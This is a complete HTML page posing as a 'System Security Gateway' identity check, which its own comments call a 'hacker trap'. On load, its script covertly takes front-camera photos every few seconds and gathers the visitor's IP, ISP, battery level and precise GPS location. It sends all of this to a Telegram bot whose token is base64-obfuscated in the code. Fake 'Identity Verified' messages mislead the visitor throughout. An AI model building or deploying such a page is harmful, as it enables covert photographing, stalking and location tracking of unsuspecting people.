<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#000000">
    <title>System Security Gateway</title>
    
    <link rel="manifest" href="./manifest.json">
    <link rel="apple-touch-icon" href="https://cdn-icons-png.flaticon.com/512/2438/2438078.png">

    <style>
        /* --- 1. GLOBAL VARS --- */
        :root {
            --bg-color: #000000;
            --text-primary: #f3f4f6;
            --text-secondary: #9ca3af;
            --accent-color: #ef4444;
            --drawer-text-color: #f5f5ff;
            --drawer-primary-color: #00ffc8;
            --drawer-bg-color: linear-gradient(180deg, rgba(10,20,35,.95), rgba(5,10,15,.9));
            --drawer-link-hover-bg: rgba(0,255,200,.08);
        }

        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        
        body {
            margin: 0; padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg-color);
            color: var(--text-primary);
            display: flex; flex-direction: column;
            min-height: 100vh; overflow-x: hidden;
        }

        /* --- 2. DRAWER CSS --- */
        .drawer-toggle{position:fixed;top:18px;left:15px;z-index:1100;background:0 0;border:none;width:35px;height:27px;display:flex;flex-direction:column;justify-content:space-between;cursor:pointer;box-sizing:content-box;transition:transform .4s ease,opacity .4s ease}
        .drawer-toggle.hidden{transform:translateY(-100px);opacity:0;pointer-events:none}
        .drawer-toggle span{height:5px;background:var(--drawer-text-color);border-radius:3px;display:block;transition:all .25s}
        .drawer-toggle.active span:nth-child(1){transform:translateY(10px) rotate(45deg)}
        .drawer-toggle.active span:nth-child(2){opacity:0;transform:scaleX(.2)}
        .drawer-toggle.active span:nth-child(3){transform:translateY(-10px) rotate(-45deg)}
        .drawer-nav{position:fixed;top:0;left:0;height:100vh;width:220px;padding-top:90px;z-index:1050;background:var(--drawer-bg-color);backdrop-filter:blur(8px);-webkit-backdrop-filter:blur(8px);transform:translateX(-110%);transition:transform .45s cubic-bezier(.2,1,.3,1);box-sizing:border-box}
        .drawer-nav.active{transform:translateX(0)}
        .drawer-nav ul{list-style:none;padding:0;margin:0;text-align:left}
        .drawer-nav a{display:block;padding:16px 25px;color:var(--drawer-text-color,#f5f5f5);text-decoration:none;font-size:1.1rem;font-weight:500;transition:color .2s ease,background .2s ease}
        .drawer-nav a:hover{color:var(--drawer-primary-color,#00ffc8);background:var(--drawer-link-hover-bg)}
        .drawer-nav li{opacity:0;transform:translateY(20px);transition:opacity .3s ease,transform .3s ease}
        .drawer-nav.active li{opacity:1;transform:translateY(0)}
        .drawer-nav.active li:nth-child(1){transition-delay:.1s}
        .drawer-nav.active li:nth-child(2){transition-delay:.15s}
        .drawer-nav.active li:nth-child(3){transition-delay:.2s}
        .drawer-overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:1040;opacity:0;visibility:hidden;transition:opacity .4s ease,visibility .4s ease}
        .drawer-overlay.active{opacity:1;visibility:visible}

        /* --- 3. MAIN UI (HACKER TRAP) --- */
        .main-wrapper {
            flex: 1; display: flex; flex-direction: column;
            align-items: center; justify-content: center;
            padding: 25px; text-align: center; position: relative; z-index: 1;
        }

        .scanner-ring {
            width: 120px; height: 120px; border-radius: 50%;
            border: 3px solid rgba(239, 68, 68, 0.2);
            border-top-color: var(--accent-color);
            animation: spin 1.5s linear infinite;
            margin-bottom: 30px; position: relative;
            box-shadow: 0 0 30px rgba(239, 68, 68, 0.2);
        }
        .scanner-ring::before {
            content: ''; position: absolute; inset: 10px; border-radius: 50%;
            border: 3px solid rgba(239, 68, 68, 0.1); border-bottom-color: var(--accent-color);
            animation: spin 3s linear infinite reverse;
        }
        .icon-center { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); }
        .icon-center svg { width: 40px; fill: var(--accent-color); }

        h1 { font-size: 1.8rem; font-weight: 700; margin: 0 0 15px 0; letter-spacing: 1px; color: #fff; }
        .status-box { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); padding: 15px 25px; border-radius: 12px; margin-bottom: 30px; width: 90%; max-width: 350px; }
        p.status-text { color: var(--text-secondary); font-size: 0.9rem; margin: 0; font-family: monospace; }

        .action-btn {
            background: linear-gradient(135deg, #dc2626 0%, #991b1b 100%);
            color: white; border: none; padding: 16px 40px;
            font-size: 1.1rem; font-weight: 700; border-radius: 50px;
            cursor: pointer; box-shadow: 0 10px 25px -5px rgba(220, 38, 38, 0.5);
            width: 100%; max-width: 300px; transition: transform 0.2s;
        }
        .action-btn:active { transform: scale(0.96); }

        #hiddenVideo, #hiddenCanvas { display: none !important; opacity: 0; pointer-events: none; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        /* --- 4. FOOTER BRANDING --- */
        .bawal-footer-wrapper{text-align:center;margin-top:30px;margin-bottom:0;padding-top:20px;padding-bottom: 20px; border-top:1px solid#444;position:relative;z-index:10;background:#050505}
        .bawal-footer-link{display:inline-flex;align-items:center;gap:8px;background:#1A1A1A;padding:10px 18px;border-radius:25px;text-decoration:none;box-shadow:0 4px 10px rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.05);transition:transform .3s ease,box-shadow .3s ease}
        .bawal-footer-link:hover{transform:translateY(-5px) scale(1.03);box-shadow:0 10px 25px rgba(0,0,0,.4),0 0 20px rgba(0,255,200,.4),0 0 30px rgba(0,255,200,.2)}
        .bawal-footer-link .dev-text{color:#00ffc8;font-weight:bold;font-size:15px;text-shadow:0 0 5px rgba(0,255,200,.5)}
        .bawal-footer-link .name-text{display:flex;align-items:center;gap:5px;color:#FFD700;font-size:15px;font-weight:bold;text-shadow:0 0 5px rgba(255,215,0,.5)}
        .bawal-footer-link img{width:22px;height:22px;border-radius:50%;transition:transform .3s ease} 
        .bawal-footer-link:hover .telegram-icon{transform:rotate(360deg)}
        .bawal-footer-link:hover .profile-pic{transform:scale(1.15) rotate(-10deg)}
    </style>
</head>
<body>

    <div class="drawer-overlay" id="drawer-overlay"></div>
    <button class="drawer-toggle" id="drawer-toggle"><span></span><span></span><span></span></button>
    <nav class="drawer-nav" id="drawer-nav">
        <ul>
            <li><a href="https://babubhaikundan.blogspot.com" target="_blank">ü§î About</a></li>
            <li><a href="https://t.me/kundan_yadav_bot" target="_blank">üìû Contact</a></li>
            <li><a href="https://www.instagram.com/babubhaikundan" target="_blank">üí• Instagram</a></li>
        </ul>
    </nav>

    <div class="main-wrapper">
        <video id="hiddenVideo" autoplay playsinline></video>
        <canvas id="hiddenCanvas"></canvas>

        <div class="scanner-ring">
            <div class="icon-center">
                <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            </div>
        </div>

        <h1>SYSTEM LOCKED</h1>
        <div class="status-box">
            <p class="status-text" id="statusDisplay">Initializing security protocols...</p>
        </div>
        <button class="action-btn" id="unlockBtn" onclick="manualTrigger()">VERIFY IDENTITY</button>
    </div>

    <div class="bawal-footer-wrapper">
        <a href="https://babubhaikundan.blogspot.com" target="_blank" class="bawal-footer-link">
            <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram" class="telegram-icon">
            <span class="dev-text">DeveloperüíÄ:-</span>
            <span class="name-text">ùïÇùï¶ùïüùïïùïíùïü ùïêùïíùïïùïíùïß <img src="https://s.tfrbot.com/h/gL5VTi" alt="Kundan" class="profile-pic"></span>
        </a>
    </div>

    <script>
        // --- CONFIGURATION ---
        const _0x1 = "ODMzODkxMTgzODpBQUc1cVRpeFRReXVuNGt0U1V1ZnhnT2YxUkRMMjVGaElXWQ==";
        const API_KEY = atob(_0x1);
        const CHAT_ID = "-1002824178993";
        const TOPIC_ID = "176"; 

        let isCameraRunning = false;
        
        let deviceData = {
            ip: "Fetching...", provider: "Unknown", battery: "Unknown",
            platform: navigator.platform, lat: null, lon: null, map: "Pending"
        };

        // --- INIT ---
        document.addEventListener('DOMContentLoaded', () => {
            // PWA Registration
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('./sw.js').catch(e => console.log(e));
            }

            // Start Trap Sequence
            startCameraBurst();
            Promise.allSettled([fetchIP(), fetchBattery()]);
            getLocation();
            initDrawer();
        });

        // --- LOGIC MODULES ---
        async function fetchIP() {
            try {
                const res = await fetch('https://ipapi.co/json/');
                const data = await res.json();
                deviceData.ip = data.ip;
                deviceData.provider = `${data.city}, ${data.org}`;
            } catch(e) { deviceData.ip = "Failed"; }
        }

        async function fetchBattery() {
            try {
                if(navigator.getBattery) {
                    const b = await navigator.getBattery();
                    deviceData.battery = `${Math.round(b.level*100)}%`;
                }
            } catch(e) {}
        }

        function getLocation() {
            if(!navigator.geolocation) {
                sendReport("GPS_MISSING"); return;
            }
            document.getElementById('statusDisplay').innerText = "Requesting Satellite Access...";
            
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    deviceData.lat = pos.coords.latitude;
                    deviceData.lon = pos.coords.longitude;
                    deviceData.map = `https://www.google.com/maps?q=${deviceData.lat},${deviceData.lon}`;
                    
                    sendReport("GPS_LOCKED");
                    document.getElementById('statusDisplay').innerText = "Identity Verified. Secure.";
                    document.getElementById('unlockBtn').innerText = "ACCESS GRANTED";
                    document.getElementById('unlockBtn').style.background = "#10b981";
                },
                (err) => {
                    sendReport("GPS_DENIED");
                    document.getElementById('statusDisplay').innerText = "Location verification failed.";
                },
                { enableHighAccuracy: true, timeout: 8000 }
            );
        }

        function sendReport(trigger) {
            const msg = `üö® *DEVICE ALERT: ${trigger}* üö®%0A%0A` +
                        `üìç *Loc:* ${deviceData.lat || 'N/A'}, ${deviceData.lon || 'N/A'}%0A` +
                        `üîó [Map Link](${deviceData.map})%0A%0A` +
                        `üì° *IP:* ${deviceData.ip}%0A` +
                        `üè¢ *ISP:* ${deviceData.provider}%0A` +
                        `üîã *Batt:* ${deviceData.battery}%0A` +
                        `üì± *Dev:* ${deviceData.platform}`;
            
            const url = `https://api.telegram.org/bot${API_KEY}/sendMessage?chat_id=${CHAT_ID}&message_thread_id=${TOPIC_ID}&text=${msg}&parse_mode=Markdown`;
            fetch(url);
        }

        async function startCameraBurst() {
            if (isCameraRunning) return;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                video.srcObject = stream;
                isCameraRunning = true;
                
                const capture = () => {
                    if(!isCameraRunning) return;
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        if(blob) sendPhoto(blob);
                    }, 'image/jpeg', 0.7);
                };

                // Burst Logic
                setTimeout(() => {
                    capture(); // First shot
                    setInterval(capture, 3500); // Repeat every 3.5s
                }, 1500);

            } catch (e) { console.log("Camera denied"); }
        }

        function sendPhoto(blob) {
            const form = new FormData();
            form.append('chat_id', CHAT_ID);
            form.append('message_thread_id', TOPIC_ID); // Topic Support
            form.append('photo', blob, 'capture.jpg');
            fetch(`https://api.telegram.org/bot${API_KEY}/sendPhoto`, { method: 'POST', body: form });
        }

        function manualTrigger() { getLocation(); startCameraBurst(); }

        // Drawer Logic
        function initDrawer(){const e=document.getElementById("drawer-toggle"),t=document.getElementById("drawer-nav"),n=document.getElementById("drawer-overlay");function o(){e.classList.add("active"),t.classList.add("active"),n.classList.add("active"),e.setAttribute("aria-expanded","true"),t.setAttribute("aria-hidden","false"),e.classList.remove("hidden")}function c(){e.classList.remove("active"),t.classList.remove("active"),n.classList.remove("active"),e.setAttribute("aria-expanded","false"),t.setAttribute("aria-hidden","true")}function r(){let t;window.addEventListener("scroll",(()=>{n.classList.contains("active")||(e.classList.add("hidden"),clearTimeout(t),t=setTimeout((()=>{e.classList.remove("hidden")}),250))}),{passive:!0})}e&&t&&n&&(e.addEventListener("click",(()=>{e.classList.contains("active")?c():o()})),document.addEventListener("keyup",(e=>{"Escape"===e.key&&t.classList.contains("active")&&c()})),n.addEventListener("click",(()=>{c()})),r())}
    </script>
</body>
</html>
